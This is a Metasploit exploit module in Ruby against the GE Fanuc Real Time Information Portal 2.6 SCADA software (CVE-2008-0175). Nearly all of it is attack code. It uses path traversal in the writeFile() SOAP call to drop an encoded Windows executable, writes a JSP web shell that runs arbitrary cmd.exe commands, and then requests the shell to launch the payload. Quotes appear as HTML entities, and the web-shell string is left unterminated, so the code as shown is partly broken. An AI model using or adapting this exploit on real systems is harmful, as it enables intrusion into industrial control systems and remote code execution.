GE Fanuc Real Time Information Portal 2.6 writeFile() API Exploit (meta)
========================================================================

##
# $Id: hooked_on_fanucs.rb
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require &#039;msf/core&#039;
require &#039;soap/rpc/driver&#039;
require &#039;soap/filter&#039;

# Must have httpaccess2 for this to work
class CookieFilter < SOAP::Filter::StreamHandler
 attr_accessor :cookie_value

 def initialize
   @cookie_value = nil
 end

 def on_http_outbound(req)
   req.header[&#039;Cookie&#039;] = @cookie_value if @cookie_value
 end

 def on_http_inbound(req, res)
   cookie = res.header[&#039;Set-Cookie&#039;][0]
   cookie.sub!(/;.*\z/, &#039;&#039;) if cookie
   @cookie_value = cookie
 end
end

class Metasploit3 < Msf::Exploit::Remote
	include Msf::Exploit::Remote::Tcp
	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;Hooked on Fanucs - GE Fanuc Real Time Information Portal 2.6 writeFile() API exploit&#039;,
			&#039;Description&#039;    => %q{
					This module exploits an API flaw in GE Fanuc SCADA software 
			},
			&#039;Author&#039;         => [ &#039;kf <kf_lists[at]digitalmunition.com>&#039; ],
			&#039;Version&#039;        => &#039;$Revision: 1 $&#039;,
			&#039;References&#039;     => 
				[
					[&#039;CVE&#039;, &#039;2008-0175&#039;],
					[&#039;URL&#039;, &#039;http://support.gefanuc.com/support/index?page=kbchannel&id=KB12460&#039;],
				],
			&#039;DefaultOptions&#039; =>
				{
					&#039;EXITFUNC&#039; => &#039;process&#039;,
				},
			&#039;Targets&#039;        =>
                                [
                                        [ &#039;GE Fanuc Real Time Information Portal 2.6&#039;, { &#039;Payload&#039; => { &#039;Space&#039; => 4000 } } ],
                                ],
                        &#039;DefaultTarget&#039;  => 0,
			&#039;Platform&#039;       => &#039;win&#039;,
			&#039;Privileged&#039;     => false
			))

			register_options(
                        [
                                Opt::RPORT(80)
                        ], self.class)

	end

	def exploit

		namespace = &#039;urn:iFixWeb&#039;
		endpoint = &#039;http://&#039; + datastore[&#039;RHOST&#039;] + &#039;/infoAgentSrv/iFixWeb&#039;  # CHANGE THIS
		proxy    = SOAP::RPC::Driver.new(endpoint,namespace)
		proxy.streamhandler.filterchain << CookieFilter.new
		proxy.wiredump_dev = STDERR # Enable this for XML output

		# Various functions to play with...
		proxy.add_method(&#039;writeFile&#039;, &#039;writeFile&#039;, &#039;p2&#039;, &#039;p3&#039;)
		proxy.add_method(&#039;login&#039;, &#039;login&#039;, &#039;p2&#039;, &#039;p3&#039;, &#039;p4&#039;)
		proxy.add_method(&#039;logout&#039;)
		proxy.add_method(&#039;getFileList&#039;, &#039;getFileList&#039;, &#039;p2&#039;)
		proxy.add_method(&#039;deleteFile&#039;, &#039;deleteFile&#039;, &#039;p2&#039;)

		proxy.login(&#039;blarg&#039;, Rex::Text.encode_base64("BBBBBBBBBBB",&#039;&#039;), &#039;zzzzzzzzz&#039;,true)
	    
                bin = Rex::Text.to_win32pe(payload.encoded, &#039;&#039;)
                cmd =  Rex::Text.encode_base64(bin,&#039;&#039;)

		proxy.writeFile(&#039;..\\..\\..\\..\\..\\..\\..\\..\\.\\..\\pwn.exe&#039;,cmd,false)
		proxy.getFileList(&#039;..\\..\\..\\..\\..\\..\\..\\..\\.\\..\\pwn.exe&#039;, 1)

		jspshell = &#039;<FORM METHOD=GET ACTION=\&#039;jspshell.jsp\&#039;>
		<INPUT name=\&#039;cmd\&#039; type=text>
		<INPUT type=submit value=\&#039;Run\&#039;>
		</FORM>
		<%@ page import="java.io.*" %>
		<%
			String cmd = request.getParameter("cmd");
			String output = "";
			if(cmd != null) {
				String s = null;
				try {
					Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
					BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
					while((s = sI.readLine()) != null) {
						output += s;
					}
				}
				catch(IOException e) {
					e.printStackTrace();
				}
			}
		%>
		<%=output %>

		proxy.writeFile(&#039;jspshell.jsp&#039;, Rex::Text.encode_base64(jspshell,&#039;&#039;),false)
		proxy.logout	
	   
		connect
		print_status("Hooked on Fanucs works for me!")
                sock.put("GET /infoAgentSrv/jspshell.jsp?cmd=c:\\pwn.exe HTTP/1.0\r\n\r\n")

		handler

                disconnect

                              
	end

end



